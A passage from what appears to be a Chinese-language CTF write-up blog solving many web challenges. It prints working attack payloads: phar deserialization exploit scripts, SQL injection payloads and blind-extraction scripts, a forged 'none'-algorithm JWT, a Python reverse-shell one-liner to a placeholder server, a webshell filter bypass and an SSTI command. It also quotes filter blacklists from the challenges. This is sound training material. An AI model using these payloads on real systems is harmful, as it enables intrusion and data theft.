exist\";\n}\n?>\n\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);//将一个func放入funcs\n        foreach ($this->files as $file) {//files为一个数组，存放new出的对象并进行遍历\n            $this->results[$file->name()][$func] = $file->$func();\n          \t//results是一个二维数组，[文件名][方法]=方法执行结果\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n\n```\n\n应该是反序列化了，提示了phar协议，正好学习一下\n\n#### phar简介\n\nphar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。可以将phar文件类比为一个压缩文件\n\n```\nphar文件结构\n\n1. a stub\n可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。\n\n2. a manifest describing the contents\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n\n3. the file contents\n被压缩文件的内容。\n\n4. [optional] a signature for verifying Phar integrity (phar file format only)\n签名，放在文件末尾\n```\n\n先找反序列化链子吧\n\n> 会发现在File类中有一个close()函数，这里还直接调用file_get_comtents()函数,那么不多说这里绝对是链子的结尾。但是如果只用这两个类是不够的，因为不能直接打印出来。所以得继续下一个类FileList继续使用，正好里面也有__call函数。func是调用的方法名，args是方法的参数\n>  \n> 那么我们就将$this->db复制为FileList类这样我们就可以直接使用该类中得方法。\n\n```PHP\n//exp.php\n<?php\n\nclass User{\n    public $db;\n    public function __construct() \n    {\n        $this->db = new FileList();\n    }\n}\n\nclass File{\n    public $filename;\n}\n\nclass FileList {\n    private $files;\n    public function __construct() \n    {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n    }\n\n}\n\n$User = new User();\n$phar = new Phar(\"./rabbit.phar\"); //.phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($User); //触发的头是User类，所以传入User对象\n$phar->addFromString(\"test.txt\", \"test\"); //生成签名\n$phar->stopBuffering();\n?>\n\n```\n\n在delete页面传入phar://文件名即可\n\n## [CISCN2019 华北赛区 Day1 Web5]CyberPunk\n\n看源码得到提示`<!--?file=?-->`伪协议读代码\n\n```php\n//confirm.php\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"已提交订单\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n//change.php\n<?php\nrequire_once \"config.php\";\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单修改成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n```\n\n关键在于confirm中没有对传入的address进行过滤，而在change中又对查询出的旧address进行了使用，所以我们在更改地址的时候就会触发我们在confirm中提交的payload\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select database()),0x7e),1)#\n1' where phone=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\n```\n\n查完库和表发现好像不是在数据库内，load_file看看文件\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select load_file('/flag.txt')),0x7e),1)#\n```\n\n拿到flag\n\n## [HFCTF2020]EasyLogin\n\n注册登录后点击`GET FLAG`显示权限不足，查看返回内容发现jwt\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 21.14.12.png)\n\n下一步不知道咋走了，看wp是要分析源码\n\n```javascript\n//app.js\nfunction login() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    const token = sessionStorage.getItem(\"token\");\n    $.post(\"/api/login\", {username, password, authorization:token})\n        .done(function(data) {\n            const {status} = data;\n            if(status) {\n                document.location = \"/home\";\n            }\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction register() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    $.post(\"/api/register\", {username, password})\n        .done(function(data) {\n            const { token } = data;\n            sessionStorage.setItem('token', token);\n            document.location = \"/login\";\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction logout() {\n    $.get('/api/logout').done(function(data) {\n        const {status} = data;\n        if(status) {\n            document.location = '/login';\n        }\n    });\n}\n\nfunction getflag() {\n    $.get('/api/flag').done(function(data) {\n        const {flag} = data;\n        $(\"#username\").val(flag);\n    }).fail(function(xhr, textStatus, errorThrown) {\n        alert(xhr.responseJSON.message);\n    });\n}\n\n```\n\n这里贴一张js代码结构图\n\n![](https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n看看controllers中的app.js\n\n```javascript\n//controllers/app.js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\n\n可以看到加密算法是HS256，尝试将其更改为None直接传入\n\n```python\nimport jwt\ntoken = jwt.encode(\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"aaaaa\",\n  \"iat\": 1649380156\n},\nalgorithm=\"none\",key=\"\").encode(encoding='utf-8')\n\nprint(token)\n```\n\n登录成功！\n\n访问/api/flag拿到flag\n\n## [b01lers2020]Welcome to Earth\n\n阴间题！！！！！！！！！！！\n\n进去就疯狂跳转，总之就是不断查看源码不要跳转到die，最终跳转到fight查看js\n\n```javascript\n// Run to scramble original flag\n//console.log(scramble(flag, action));\nfunction scramble(flag, key) {\n  for (var i = 0; i < key.length; i++) {\n    let n = key.charCodeAt(i) % flag.length;\n    let temp = flag[i];\n    flag[i] = flag[n];\n    flag[n] = temp;\n  }\n  return flag;\n}\n\nfunction check_action() {\n  var action = document.getElementById(\"action\").value;\n  var flag = [\"{hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!}\", \"_baa\", \"aaaa\", \"pctf\"];\n\n  // TODO: unscramble function\n}\n```\n\n按照人间语法拼出flag\n\n```\npctf{hey_boys_im_baaaaaaaaaack!}\n```\n\n## [WUSTCTF2020]CV Maker\n\n看到这种模版化的界面，尝试扫目录看看是不是代码审计，结果没有，乖乖注册登录，发现可以上传头像，空文件直接上传发现警告\n\n```\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76\n```\n\nemmmmmmm，使用exif_imagetype可使用幻数头绕过，上传木马\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 22.05.39.png)\n\n访问拿flag即可\n\n## [GYCTF2020]Ezsqli\n\n布尔注入喵喵，脚本懒得贴了喵喵\n\n```\ndatabase：give_grandpa_pa_pa_pa\n```\n\ninformation_schema被ban了，mysql.innodb_table_stats也被ban了，新新知识居然还有个能用的\n\n```mysql\nselect group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()\ntable:f1ag_1s_h3r3_hhhhh,users233333333333333\n1^((select ('~','~'))>(select * from f1ag_1s_h3r3_hhhhh))\n```\n\n最后就是无列名注入啦\n\n```python\nimport requests\nflagname=\"flag-{1234567890bcdefg}\"\nname=\",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890\"\nurl=\"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php\"\nflag=\"\"\nfor i in range(1,100):\n    for j in range(33,128):\n        tmp=flag+chr(j)\n        data={'id':f\"0^((select 1,'{tmp}')>(select * from f1ag_1s_h3r3_hhhhh))\"}\n        tes=requests.post(url=url,data=data).text\n        if \"Nu1L\" in tes:\n            print(chr(j-1),end=\"\")\n            flag=flag+chr(j-1)\n            break\n```\n\n## [网鼎杯 2018]Comment\n\n先爆破登录，zhangwei666\n\n.git文件泄露\n\nGitHack扫出后发现代码内容不全，使用Git恢复旧仓库\n\n```php\n//write_do.php\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n很明显在comment处存在二次注入，又因为此处insert是带有换行的，所以不能直接使用#来进行注释，使用/**/进行多行注释，构造payload\n\n```mysql\ncategory:0',content=database(),/*\n留言comment处:*/#\n最终构造出的语句\ninsert into comment\nset category = '0',content=database(),/*',\ncontent = '*/#',\nbo_id = '$bo_id'\";\n\ninsert into comment set category = '0',content=database(),bo_id = '$bo_id'\";\n```\n\n在回显留言即可看到结果\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 08.47.30.png)\n\n按照这个方法查完全库也没有结果，尝试loadfile吧，不知道读啥，捞一下wp的结果\n\n> load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。\n> 一般用法步骤：\n> 读/etc/init.d下的东西，这里有配置文件路径\n> ?id=1' union select 1,2,load_file('/etc/init.d/httpd')\n> 得到web安装路径\n> ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')\n> 读取密码文件\n> ?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')\n\n先看/etc/passwd\n\n```\nwww:x:500:500:www:/home/www:/bin/bash\n```\n\n得到跑web服务的用户\n\n> 每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。\n\n访问拿到用过的命令\n\n```\ncd /tmp/ \nunzip html.zip \nrm -f html.zip \ncp -r html /var/www/ \ncd /var/www/html/ \nrm -f .DS_Store \nservice apache2 start\n```\n\n访问/tmp/html/.DS_Store拿到文件夹内容，太长内容可能包含sql语句，使用16进制编码，发现文件`flag_8946e1ff1ee3e40f.php`，读取拿flag即可，记得读/var/www/html下的文件，tmp中的不正确\n\n## [watevrCTF-2019]Cookie Store\n\ncookiebase64解一下然后改了价格再传回去\n\n## [网鼎杯 2020 白虎组]PicDown\n\nPicDown，下载照片，尝试访问/etc/passwd下载成功，看来可以找找源码，没啥文件包含思路，看wp，是linux的进程文件\n\n> 可以通过/proc/pid/ 来 获 取 指 定 进 程 的 信 息 ， 例 如 内 存 映 射 、 CPU绑 定 信 息 等 等 。 如 果 某 个 进 程 想 要 获 取 本 进 程 的 系 统 信 息 ， 就 可 以 通 过 进 程 的pid来 访 问 /proc/ pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。\n\n其中的重要文件\n\n```\ncmdline\ncmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：\n\ncwd\ncwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录\n\nenviron\nenviron文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息\n\nfd\nfd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。\n```\n\n利用\n\n```\n1.获取当前启动进程的完成命令：\ncat /proc/self/cmdline\n\n2.获取目标当前进程的运行目录与目录里的文件：\nls -al /proc/self/cwd\nls /proc/self/cwd\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n4.获取当前环境变量\ncat /proc/self/environ\n\n5.获取当前进程打开的文件内容\ncat /proc/self/fd/{id}\n也可以是：\ncat /proc/*/fd/*    --*可以代替任意数字和字母\n```\n\n本题中我们可以访问一下这几个位置\n\n```\ncmdline\npython2 app.py\n\nenviron\nMAIL=/var/mail/app\nUSER=app\nHOME=/home/app\nLOGNAME=app\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nSHELL=/bin/sh\nPWD=/app\n```\n\n在运行位置拿到源码\n\n```python\n#/proc/self/cwd/app.py\nfrom flask import Flask, Response\nfrom flask import render_template\nfrom flask import request\nimport os\nimport urllib\n\napp = Flask(__name__)\n\nSECRET_FILE = \"/tmp/secret.txt\"\nf = open(SECRET_FILE)\nSECRET_KEY = f.read().strip()\nos.remove(SECRET_FILE)\n\n\n@app.route('/')\ndef index():\n    return render_template('search.html')\n\n\n@app.route('/page')\ndef page():\n    url = request.args.get(\"url\")\n    try:\n        if not url.lower().startswith(\"file\"):\n            res = urllib.urlopen(url)\n            value = res.read()\n            response = Response(value, mimetype='application/octet-stream')\n            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'\n            return response\n        else:\n            value = \"HACK ERROR!\"\n    except:\n        value = \"SOMETHING WRONG!\"\n    return render_template('search.html', res=value)\n\n\n@app.route('/no_one_know_the_manager')\ndef manager():\n    key = request.args.get(\"key\")\n    print(SECRET_KEY)\n    if key == SECRET_KEY:\n        shell = request.args.get(\"shell\")\n        os.system(shell)\n        res = \"ok\"\n    else:\n        res = \"Wrong Key!\"\n\n    return res\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n\n```\n\n可以看到代码中打开了`/tmp/secret.txt`并且将其中的内容作为SECRET_KEY，所以我们访问到这个文件就行了，尝试直接读取发现失败，那么我们利用proc文件中的fd文件夹，id从1开始尝试，最终可以拿到该文件\n\n```\nurl=/proc/self/fd/3\np3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=\n```\n\n尝试传参，成功，但是命令执行成功后却没有回显，下一步就是反弹shell或者写文件\n\n反弹shell\n\n```\npayload:\nkey=p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=&shell=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"服务器IP喵喵\",监听端口喵喵));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n~~骚操作直接访问/flag下载文件~~\n\n## [SWPUCTF 2018]SimplePHP\n\n查看文件处可以查看页面源码\n\n```php\n//file.php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} \n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\n```php\n//class.php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str=new Show;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str['str']=new Test;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params['source']=\"/var/www/html/f1ag.php\";\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n```php\n//function.php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\n反序列化找链子很明显了\n\n```\nC1e4r::__destruct->Show::__toString->Test::__get->Test::get->Test::file_get\n```\n\n构造反序列化\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n}\n\n$a = new C1e4r();\n$b = new Show();\n$a->str = $b;\n$c = new Test();\n$c->params['source'] = \"/var/www/html/f1ag.php\";//目标文件\n$b->str['str'] = $c;  //触发__get;\n\n\n$phar = new Phar(\"exp.phar\"); //生成phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a); //触发类是C1e4r类\n$phar->addFromString(\"text.txt\", \"test\"); //签名\n$phar->stopBuffering();\n\n?>\n```\n\nphar访问即可\n\n## [红明谷CTF 2021]write_shell\n\n```\nif(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n\tdie('hacker!!!');\n```\n\n看看都过滤了啥\n\n空格，下划线，php，分号，~，^，+，eval，花括号\n\n首先是php标签绕过，有短标签\n\n```\n<?=`命令`?>\n<?echo\"1\"?>\n<% echo\"1\";%>\n```\n\n使用第一个来执行命令，然后就是空格，用制表符%09代替，根目录读取即可\n\n```\npayload:data=<?=`cat%09/flllllll1112222222lag`?>\n```\n\n## [HarekazeCTF2019]encode_and_encode\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // no path traversal\n    '\\.\\.',\n    // no stream wrapper\n    '(php|file|glob|data|tp|zip|zlib|phar):',\n    // no data exfiltration\n    'flag'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\n$body = file_get_contents('php://input');\n$json = json_decode($body, true);\n\nif (is_valid($body) && isset($json) && isset($json['page'])) {\n  $page = $json['page'];\n  $content = file_get_contents($page);\n  if (!$content || !is_valid($content)) {\n    $content = \"<p>not found</p>\\n\";\n  }\n} else {\n  $content = '<p>invalid request</p>';\n}\n\n// no data exfiltration!!!\n$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);\necho json_encode(['content' => $content]);\n```\n\n我真绕不过去啊，wp\n\n> json字符转译，json会将utf-8编码的字符自动转为原始字符\n\n这就好办了，直接将想读取内容中的flag进行utf-8编码即可，又因为下面对匹配flag的字符串进行了过滤，所以使用伪协议读取\n\n```\npayload:\nPOST\n{\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}\n```\n\n## [RootersCTF2019]I_<3_Flask\n\nSSTI很明显了，就是这个传参不好找，用个脚本Arjun用来爆参数的\n\n```\nname={{url_for.__globals__[\"os\"].popen('cat flag.txt').read()}}\n```\n\n## [NCTF2019]SQLi\n\n贴心的提示，ban的可真多\n\n```\n$black_list = \"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|<|>|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\";\n\n\nIf $_POST['passwd'] === admin's password,Then you will get the flag;\n```\n\n所有的注释都没了，PHP版本又<5.3.4，使用00截断来裁切后面语句，构造payload\n\n```mysql\nusername=\\&passwd=||(passwd/**/regexp/**/\"^y\");%00\n构造出的语句就是\nselect * from users where username='\\' and passwd='||(passwd/**/regexp/**/\"^w\");%00'\n```\n\n```python\nimport requests\nimport time\nfrom urllib import parse\nurl=\"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php\"\nname=\"qwertyuiopasdfghjklzxcvbnm_}{0123456789\"\nflag=\"\"\nfor i in range(1,100):\n    for j in name:\n        tmp=flag+j\n        data={'username':'\\\\',\n            'passwd':f\"||(passwd/**/regexp/**/\\\"^{tmp}\\\");{parse.unquote('%00')}\"\n        }\n        co=requests.post(url=url,data=data).status_code\n        if co==404:\n            